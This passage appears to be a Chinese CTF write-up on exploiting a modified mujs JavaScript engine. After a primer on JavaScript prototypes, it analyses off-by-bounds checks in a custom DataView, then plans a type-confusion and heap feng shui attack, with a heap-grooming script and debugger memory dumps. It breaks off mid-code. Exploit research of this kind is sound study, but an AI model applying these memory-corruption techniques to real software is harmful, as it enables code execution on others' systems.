<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">firstName, lastName, age, eyeColor</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.firstName = firstName;  </span><br><span class="line">    <span class="built_in">this</span>.lastName = lastName;</span><br><span class="line">    <span class="built_in">this</span>.age = age;</span><br><span class="line">    <span class="built_in">this</span>.eyeColor = eyeColor;</span><br><span class="line">    <span class="built_in">this</span>.changeName = <span class="function"><span class="keyword">function</span> (<span class="params">name</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.lastName = name;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p1 = <span class="keyword">new</span> Person(<span class="string">&#x27;yhellow&#x27;</span>,<span class="string">&#x27;chunk&#x27;</span>,<span class="number">99</span>,<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> p2 = <span class="keyword">new</span> Person(<span class="string">&#x27;yhellow&#x27;</span>,<span class="string">&#x27;chunk&#x27;</span>,<span class="number">99</span>,<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line"><span class="built_in">console</span>.log(p1.changeName == p2.changeName) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<ul>
<li>实例对象 p1，p2 拥有完全一样的内容，但是其属性方法却是不同的</li>
<li>关键字 function 需要在 heap 中开辟一片空间，用于存放 function 的代码，然后把这片地址返回出去</li>
<li>两个实例对象 p1，p2 导致一模一样 function 被重复写入了两次，这就造成了资源浪费</li>
</ul>
<p>常规解决办法：</p>
<ul>
<li>使用全局函数：可以直接把 function 变为全局函数，在构造函数中赋值其地址就行了，但这种方法会污染全局变量</li>
<li>使用对象：把这些全局函数用一个专业的对象组织起来，这些函数就变成这个对象的属性了</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">    <span class="attr">fn1</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;chunk1&#x27;</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">fn2</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;chunk2&#x27;</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">fn3</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;chunk3&#x27;</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">firstName, lastName, age, eyeColor</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.firstName = firstName;  </span><br><span class="line">    <span class="built_in">this</span>.lastName = lastName;</span><br><span class="line">    <span class="built_in">this</span>.age = age;</span><br><span class="line">    <span class="built_in">this</span>.eyeColor = eyeColor;</span><br><span class="line">    <span class="built_in">this</span>.fun1 =obj.fn1</span><br><span class="line">    <span class="built_in">this</span>.fun2 =obj.fn2</span><br><span class="line">    <span class="built_in">this</span>.fun3 =obj.fn3</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p1 = <span class="keyword">new</span> Person(<span class="string">&#x27;yhellow&#x27;</span>,<span class="string">&#x27;chunk&#x27;</span>,<span class="number">99</span>,<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> p2 = <span class="keyword">new</span> Person(<span class="string">&#x27;yhellow&#x27;</span>,<span class="string">&#x27;chunk&#x27;</span>,<span class="number">99</span>,<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line"><span class="built_in">console</span>.log(p1.fun1 == p2.fun1) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<ul>
<li>这种方法可以避免资源浪费，也可以防止全局变量污染，但它自己还是会污染全局变量</li>
<li>为了解决这个问题，JavaScript 会为每个构造器创建一个原型对象，这个原型对象可以起到和上述 obj 对象一样的作用</li>
<li>PS：原型对象不是对象，而是属性</li>
</ul>
<p><strong>JavaScript 原型对象</strong></p>
<p>在 JavaScript 中每个构造器（函数）都有一个内置属性叫 <strong>prototype</strong>，它叫原型 ，也是个对象，我们叫这个对象为原型对象</p>
<p>在 Chrome 浏览器中按 Ctrl+Shift+J 启动控制台，创建一个对象并查看其属性：</p>
<p><img src="/2022/10/01/JavaScript%20pwn+%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/1658554021983.png" alt="1658554021983"> </p>
<ul>
<li>可以发现该对象中有一个 [[prototype]] 属性，指向该属性的原型对象 String</li>
</ul>
<p><img src="/2022/10/01/JavaScript%20pwn+%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/1658554308594.png" alt="1658554308594"> </p>
<ul>
<li>继续展开 [[prototype]]，发现它也有 [[prototype]] 属性，指向 String 的原型对象 Object</li>
</ul>
<p>这些就很清晰了，每一个对象都有一个内置属性叫 <strong>prototype</strong>，指向该属性的原型对象（Object 没有 prototype，因为 Object 是所有对象的基础），所有的 JavaScript 对象都会从一个 prototype（原型对象）中继承属性和方法：</p>
<ul>
<li><code>Date</code> 对象从 <code>Date.prototype</code> 继承</li>
<li><code>Array</code> 对象从 <code>Array.prototype</code> 继承</li>
<li><code>Person</code> 对象从 <code>Person.prototype</code> 继承</li>
<li>所有 JavaScript 中的对象都是位于原型链顶端的 <code>Object</code> 的实例</li>
</ul>
<p>如果上述案例不使用全局对象 obj，而是使用原型对象的话，代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">firstName, lastName, age, eyeColor</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.firstName = firstName;  </span><br><span class="line">    <span class="built_in">this</span>.lastName = lastName;</span><br><span class="line">    <span class="built_in">this</span>.age = age;</span><br><span class="line">    <span class="built_in">this</span>.eyeColor = eyeColor;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person.prototype.fun1 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;chunk1&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">Person.prototype.fun2 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;chunk2&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">Person.prototype.fun3 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;chunk3&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p1 = <span class="keyword">new</span> Person(<span class="string">&#x27;yhellow&#x27;</span>,<span class="string">&#x27;chunk&#x27;</span>,<span class="number">99</span>,<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> p2 = <span class="keyword">new</span> Person(<span class="string">&#x27;yhellow&#x27;</span>,<span class="string">&#x27;chunk&#x27;</span>,<span class="number">99</span>,<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line"><span class="built_in">console</span>.log(p1.fun1 == p2.fun1) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<ul>
<li>打印 p1 的信息如下：</li>
</ul>
<p><img src="/2022/10/01/JavaScript%20pwn+%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/1658558381899.png" alt="1658558381899"> </p>
<ul>
<li>fun1，fun2，fun3 都在 [[prototype]]（<code>Person.prototype</code>）中，并且会被 <code>Person</code> 继承</li>
</ul>
<p>JavaScript new 一个对象的过程：</p>
<ul>
<li>创建一个空对象</li>
<li>将空对象的原型指向构造函数的原型（继承函数的原型）</li>
<li>将属性和方法添加至这个对象（改变 this 各个条目的指向）</li>
<li>对构造函数返回值的处理判断（忽略返回的基本类型，只返回引用类型）</li>
</ul>
<p>案例，以下代码可以模拟 new 的过程，产生和 new 一样的效果：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Fun</span>(<span class="params">age,name</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.age = age;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create</span>(<span class="params">fn, ...args</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> obj = &#123;&#125;; <span class="comment">// 创建一个空对象</span></span><br><span class="line">    <span class="built_in">Object</span>.setPrototypeOf(obj,fn.prototype) <span class="comment">// 将空对象的原型指向构造函数的原型</span></span><br><span class="line">    <span class="keyword">var</span> result = fn.apply(obj,args); <span class="comment">// 将属性和方法添加至这个对象</span></span><br><span class="line">    <span class="keyword">return</span> result <span class="keyword">instanceof</span> <span class="built_in">Object</span> ? result : obj; <span class="comment">// 对构造函数返回值的处理判断</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">new</span> Fun(<span class="number">18</span>,<span class="string">&#x27;yhellow&#x27;</span>))</span><br><span class="line"><span class="built_in">console</span>.log(create(Fun,<span class="number">18</span>,<span class="string">&#x27;yhellow&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p><img src="/2022/10/01/JavaScript%20pwn+%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/1658627038107.png" alt="1658627038107">  </p>
<p><strong>DataView 视图</strong></p>
<p>DataView 视图是一个可以从 ArrayBuffer 对象中读写多种数值类型的底层接口，在读写时不用考虑平台字节序问题</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">DataView</span>(buffer [, byteOffset [, byteLength]])</span><br></pre></td></tr></table></figure>
<ul>
<li>buffer：一个 <code>ArrayBuffer</code> 或 <code>SharedArrayBuffer</code> 对象，DataView 对象的数据源</li>
<li>byteOffset：可选，此 DataView 对象的第一个字节在 buffer 中的偏移，如果不指定则默认从第一个字节开始</li>
<li>byteLength：可选，此 DataView 对象的字节长度，如果不指定则默认与 buffer 的长度相同</li>
</ul>
<p>PS：后来发现题目中的 DataView 和 DataView 视图没有多大的关系，题目的 DataView 有点像作者为 mujs 写的插件，内在逻辑都是自定义的</p>
<p>参考：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/section/1191578">DataView (DataView) - JavaScript 中文开发手册</a> </p>
<p><strong>漏洞分析</strong></p>
<p>程序的代码量有点大，但通过 diff 命令可以得到 jsdataview.c 文件是题目独有的，漏洞点极有可能在这里</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Dv_setUint8</span><span class="params">(js_State *J)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	js_Object *self = js_toobject(J, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (self-&gt;type != JS_CDATAVIEW) js_typeerror(J, <span class="string">&quot;not an DataView&quot;</span>);</span><br><span class="line">	<span class="keyword">size_t</span> index = js_tonumber(J, <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">uint8_t</span> value = js_tonumber(J, <span class="number">2</span>);</span><br><span class="line">	<span class="keyword">if</span> (index &lt; self-&gt;u.dataview.length+<span class="number">0x9</span>) &#123; <span class="comment">/* target */</span></span><br><span class="line">		self-&gt;u.dataview.data[index] = value;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		js_error(J, <span class="string">&quot;out of bounds access on DataView&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Dv_getUint32</span><span class="params">(js_State *J)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	js_Object *self = js_toobject(J, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (self-&gt;type != JS_CDATAVIEW) js_typeerror(J, <span class="string">&quot;not an DataView&quot;</span>);</span><br><span class="line">	<span class="keyword">size_t</span> index = js_tonumber(J, <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">if</span> (index+<span class="number">3</span> &lt; self-&gt;u.dataview.length) &#123; <span class="comment">/* target */</span></span><br><span class="line">		js_pushnumber(J, *(<span class="keyword">uint32_t</span>*)&amp;self-&gt;u.dataview.data[index]);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		js_pushundefined(J);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>setUintN 用于将无符号的N位整数存储在指定位置</li>
<li>getUintN 用于获取存储在指定位置的无符号N位整数</li>
</ul>
<p>漏洞点还是比较明显的：</p>
<ul>
<li>Dv_setUint8 向后溢出 9 字节</li>
<li>Dv_getUint32 向前溢出 3 字节</li>
</ul>
<p>但是要真正利用这个漏洞，还必选理解程序的功能：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">jsB_initdataview</span><span class="params">(js_State *J)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	js_pushobject(J, J-&gt;DataView_prototype);</span><br><span class="line">	&#123;</span><br><span class="line">		jsB_propf(J, <span class="string">&quot;DataView.prototype.getUint8&quot;</span>, Dv_getUint8, <span class="number">1</span>);</span><br><span class="line">		jsB_propf(J, <span class="string">&quot;DataView.prototype.setUint8&quot;</span>, Dv_setUint8, <span class="number">2</span>);</span><br><span class="line">		jsB_propf(J, <span class="string">&quot;DataView.prototype.getUint16&quot;</span>, Dv_getUint16, <span class="number">1</span>);</span><br><span class="line">		jsB_propf(J, <span class="string">&quot;DataView.prototype.setUint16&quot;</span>, Dv_setUint16, <span class="number">2</span>);</span><br><span class="line">		jsB_propf(J, <span class="string">&quot;DataView.prototype.getUint32&quot;</span>, Dv_getUint32, <span class="number">1</span>);</span><br><span class="line">		jsB_propf(J, <span class="string">&quot;DataView.prototype.setUint32&quot;</span>, Dv_setUint32, <span class="number">2</span>);</span><br><span class="line">		jsB_propf(J, <span class="string">&quot;DataView.prototype.getLength&quot;</span>, Dv_getLength, <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	js_newcconstructor(J, jsB_new_DataView, jsB_new_DataView, <span class="string">&quot;DataView&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	js_defglobal(J, <span class="string">&quot;DataView&quot;</span>, JS_DONTENUM);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>有点类似于“注册函数”，把 JavaScript 层函数名称和 C 层的具体函数进行绑定</li>
<li>设置了创建函数 jsB_new_DataView</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">jsB_new_DataView</span><span class="params">(js_State *J)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> top = js_gettop(J);</span><br><span class="line">	<span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (top != <span class="number">2</span>) &#123;</span><br><span class="line">		js_typeerror(J, <span class="string">&quot;new DataView expects a size&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	size = js_tonumber(J, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	js_Object *obj = jsV_newobject(J, JS_CDATAVIEW, J-&gt;DataView_prototype);</span><br><span class="line">	obj-&gt;u.dataview.data = js_malloc(J, size);</span><br><span class="line">	<span class="built_in">memset</span>(obj-&gt;u.dataview.data, <span class="number">0</span>, size);</span><br><span class="line">	obj-&gt;u.dataview.length = size;</span><br><span class="line">	js_pushobject(J, obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>创建了一个 js_Object 结构体，js_malloc 申请了一个堆块</li>
</ul>
<p><strong>类型混淆+堆风水</strong></p>
<p>先看看 js_Object 结构体中的内容：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">js_Object</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">js_Class</span> <span class="title">type</span>;</span></span><br><span class="line">	<span class="keyword">int</span> extensible;</span><br><span class="line">	js_Property *properties;</span><br><span class="line">	<span class="keyword">int</span> count; <span class="comment">/* number of properties, for array sparseness check */</span></span><br><span class="line">	js_Object *prototype;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="keyword">int</span> boolean;</span><br><span class="line">		<span class="keyword">double</span> number;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="keyword">const</span> <span class="keyword">char</span> *<span class="built_in">string</span>;</span><br><span class="line">			<span class="keyword">int</span> length;</span><br><span class="line">		&#125; s;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="keyword">int</span> length;</span><br><span class="line">		&#125; a;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			js_Function *function;</span><br><span class="line">			js_Environment *scope;</span><br><span class="line">		&#125; f;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">			js_CFunction function;</span><br><span class="line">			js_CFunction constructor;</span><br><span class="line">			<span class="keyword">int</span> length;</span><br><span class="line">			<span class="keyword">void</span> *data;</span><br><span class="line">			js_Finalize finalize;</span><br><span class="line">		&#125; c;</span><br><span class="line">		js_Regexp r;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			js_Object *target;</span><br><span class="line">			js_Iterator *head;</span><br><span class="line">		&#125; iter;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="keyword">const</span> <span class="keyword">char</span> *tag;</span><br><span class="line">			<span class="keyword">void</span> *data;</span><br><span class="line">			js_HasProperty has;</span><br><span class="line">			js_Put put;</span><br><span class="line">			js_Delete <span class="keyword">delete</span>;</span><br><span class="line">			js_Finalize finalize;</span><br><span class="line">		&#125; user;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		    <span class="keyword">uint32_t</span> length;</span><br><span class="line">		    <span class="keyword">uint8_t</span>* data;</span><br><span class="line">		&#125; dataview;</span><br><span class="line">	&#125; u;</span><br><span class="line">	js_Object *gcnext; <span class="comment">/* allocation list */</span></span><br><span class="line">	js_Object *gcroot; <span class="comment">/* scan list */</span></span><br><span class="line">	<span class="keyword">int</span> gcmark;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>js_Object 的第一个字节可以被覆盖，而它表示该对象的类型</li>
<li>因此必须用堆风水把有溢出的 dataview.data 申请到 js_Object 前面</li>
</ul>
<p>在此之前先分析一下程序的流程：</p>
<ul>
<li><code>main</code>：注释掉了大部分的内置函数，只留下了个 <code>print</code>，控制权交给 <code>js_dofile</code></li>
<li><code>js_dofile</code>：调用 <code>js_loadfile</code> 设置栈，调用 <code>js_call</code> 运行代码</li>
<li><code>js_call</code>：从栈中获取 <code>obj</code>， 然后这个 <code>obj</code> 就是要调用的函数，最后进入 <code>jsR_run</code></li>
<li><code>jsR_run</code>：获取 <code>opcode</code> 并执行，C层的代码会通过 <code>jsR_callcfunction</code> 进行调用</li>
</ul>
<p>测试样例：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">b = <span class="built_in">DataView</span>(<span class="number">0x68</span>);</span><br><span class="line">a = <span class="built_in">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line">b = <span class="built_in">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line">c = <span class="built_in">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line">e = <span class="built_in">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line">f = <span class="built_in">DataView</span>(<span class="number">0x1000</span> * <span class="number">0x1000</span>);</span><br><span class="line"><span class="comment">/* jsB_new_DataView:0x555555571870 */</span></span><br><span class="line"><span class="comment">/* Dv_setUint8:0x555555577680 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>首次执行 <code>jsB_new_DataView</code> 堆环境很乱，这是因为程序在 <code>jsB_init</code> 中对各种类型进行了初始化，导致 heap 出现了许多 free chunk 和 tcache，扰乱了后续的分配</li>
<li>PS：Bindiff 对 <code>jsB_new_DataView</code> 的识别不是很到位，所以这里推荐用字符串来定位该函数</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x5555555c2af0</span> <span class="comment">/* dataview.data */</span> </span><br><span class="line">Size: <span class="number">0x51</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x5555555c2b40</span> <span class="comment">/* js_Object */</span></span><br><span class="line">Size: <span class="number">0x71</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x5555555c2b40</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x5555555c2b40</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x5555555c2b48</span> ◂— <span class="number">0x71</span> <span class="comment">/* &#x27;q&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x5555555c2b50</span> ◂— <span class="number">0x100000010</span> <span class="comment">/* type:dataview */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x5555555c2b58</span> —▸ <span class="number">0x55555559b0a0</span> —▸ <span class="number">0x555555585089</span> ◂— <span class="number">0x6d6172676f727000</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x5555555c2b60</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x5555555c2b68</span> —▸ <span class="number">0x5555555a5780</span> ◂— <span class="number">0x100000010</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x5555555c2b70</span> ◂— <span class="number">0x48</span> <span class="comment">/* length */</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x5555555c2b78</span> —▸ <span class="number">0x5555555c2bc0</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>可以利用漏洞修改 <code>js_Object-&gt;type</code>，从而造成类型混淆</li>
<li>核心思路就是：利用 <code>js_Object</code> 的联合体中，占用相同内存位置的其他类型字符来修改 <code>js_Object.u.dataview.length</code>，导致更大的堆溢出</li>
<li>联合体中的 <code>js_Object.u.dataview.length</code> <code>js_Object.u.c.name</code> <code>js_Object.u.number</code> 占用同一内存位置（由于指针需要8字节对齐，<code>dataview.length</code> 在联合体中应该占用8字节，因此不用担心覆盖后面的 <code>dataview.data</code>）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">js_setdate</span><span class="params">(js_State *J, <span class="keyword">int</span> idx, <span class="keyword">double</span> t)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        js_Object *self = js_toobject(J, idx);</span><br><span class="line">        <span class="keyword">if</span> (self-&gt;type != JS_CDATE)</span><br><span class="line">                js_typeerror(J, <span class="string">&quot;not a date&quot;</span>);</span><br><span class="line">        self-&gt;u.number = TimeClip(t);</span><br><span class="line">        js_pushnumber(J, self-&gt;u.number);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Dp_setTime</span><span class="params">(js_State *J)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        js_setdate(J, <span class="number">0</span>, js_tonumber(J, <span 